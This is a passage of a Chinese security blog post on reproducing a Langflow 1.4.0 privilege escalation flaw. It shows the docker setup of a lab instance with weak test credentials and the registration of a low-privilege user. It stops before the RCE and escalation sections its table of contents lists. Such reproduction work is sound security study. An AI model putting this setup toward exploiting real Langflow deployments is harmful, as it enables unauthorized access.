<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>Langflow权限提升漏洞 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="漏洞复现docker启动    docker run -it --rm \       -p 7860:7860 \       -e LANGFLOW_ENABLE_AUTH&#x3D;True \       -e LANGFLOW_SUPERUSER&#x3D;admin \       -e LANGFLOW_SUPERUSER_PASSWORD&#x3D;123456 \       -e LANGFLOW_AUTO">
<meta property="og:type" content="article">
<meta property="og:title" content="Langflow权限提升漏洞">
<meta property="og:url" content="http://ta0.fun/posts/31287ede/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="漏洞复现docker启动    docker run -it --rm \       -p 7860:7860 \       -e LANGFLOW_ENABLE_AUTH&#x3D;True \       -e LANGFLOW_SUPERUSER&#x3D;admin \       -e LANGFLOW_SUPERUSER_PASSWORD&#x3D;123456 \       -e LANGFLOW_AUTO">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112423578.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112428905.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112434076.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112438925.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112444235.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112453887.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112457639.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112501805.png">
<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112505951.png">
<meta property="article:published_time" content="2025-09-24T05:13:56.097Z">
<meta property="article:modified_time" content="2025-09-24T05:22:49.771Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112423578.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">153</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">17</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">docker启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%BD%8E%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">注册低权限用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">4.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81"><span class="toc-number">7.</span> <span class="toc-text">补丁</span></a></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnhub</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a5814cc3/">Vulnhub-64base</a></li><li class="sidebar-cat-post"><a href="/posts/b7e54991/">Vulnhub-Mercy</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/31287ede/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Langflow权限提升漏洞</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-09-24 13:13:56" itemprop="dateCreated datePublished" datetime="2025-09-24T13:13:56+08:00">2025-09-24</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">10m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/WEB%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">WEB安全</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="docker启动"><a href="#docker启动" class="headerlink" title="docker启动"></a>docker启动</h2><pre class="language-bash" data-language="bash"><code class="language-bash">    <span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--rm</span> <span class="token punctuation">\</span>
      <span class="token parameter variable">-p</span> <span class="token number">7860</span>:7860 <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_ENABLE_AUTH</span><span class="token operator">=</span>True <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_SUPERUSER</span><span class="token operator">=</span>admin <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_SUPERUSER_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_AUTO_LOGIN</span><span class="token operator">=</span>False <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_SECRET_KEY</span><span class="token operator">=</span>secretK3Y <span class="token punctuation">\</span>
      <span class="token parameter variable">-e</span> <span class="token assign-left variable">LANGFLOW_NEW_USER_IS_ACTIVE</span><span class="token operator">=</span>True <span class="token punctuation">\</span>
      langflowai/langflow:1.4.0

╭─────────────────────────────────────────────────────────────────────────╮
│                                                                         │
│  Welcome to Langflow                                                    │
│                                                                         │
│  🌟 GitHub: Star <span class="token keyword">for</span> updates → https://github.com/langflow-ai/langflow  │
│  💬 Discord: Join <span class="token keyword">for</span> support → https://discord.com/invite/EqksyE2EX9   │
│                                                                         │
│  We collect anonymous usage data to improve Langflow.                   │
│  To opt out, set: <span class="token assign-left variable">DO_NOT_TRACK</span><span class="token operator">=</span>true <span class="token keyword">in</span> your environment.                │
│                                                                         │
│  🟢 Open Langflow → http://0.0.0.0:7860                                 │
│                                                                         │
╰─────────────────────────────────────────────────────────────────────────╯</code></pre>

<p>注意开启LANGFLOW_ENABLE_AUTH启用认证，并且关闭自动登录，不然登录上去的就是superuser.</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112423578.png" alt="image-20250828112423578" loading="lazy"></p>
<h2 id="注册低权限用户"><a href="#注册低权限用户" class="headerlink" title="注册低权限用户"></a>注册低权限用户</h2><p>启动docker后可以注册用户，先注册一个普通用户 <code>testtest:123456</code>。</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250828112428905.png" alt="image-20250828112428905" loading="lazy"></p>
